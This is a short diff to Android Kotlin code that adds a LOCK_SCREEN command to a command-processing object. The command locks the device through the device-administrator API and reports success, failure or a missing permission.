@@ -584,6 +584,23 @@ object CommandProcessor {
                     }
                     status = "DISPLAY_RESTORED"
                 }
+                "LOCK_SCREEN" -> {
+                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    val adminComponent = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
+                    
+                    if (dpm.isAdminActive(adminComponent)) {
+                        try {
+                            dpm.lockNow()
+                            status = "DEVICE_LOCKED"
+                        } catch (e: Exception) {
+                            status = "LOCK_FAILED"
+                            errorMsg = e.message
+                        }
+                    } else {
+                        status = "FAILED_PERMISSION (DEVICE_ADMIN)"
+                        errorMsg = "App is not an active Device Administrator."
+                    }
+                }
                 "INSTALL_APP" -> {
                     val parts = content.split("|", limit = 2)
                     val apkPath = parts[0].trim()
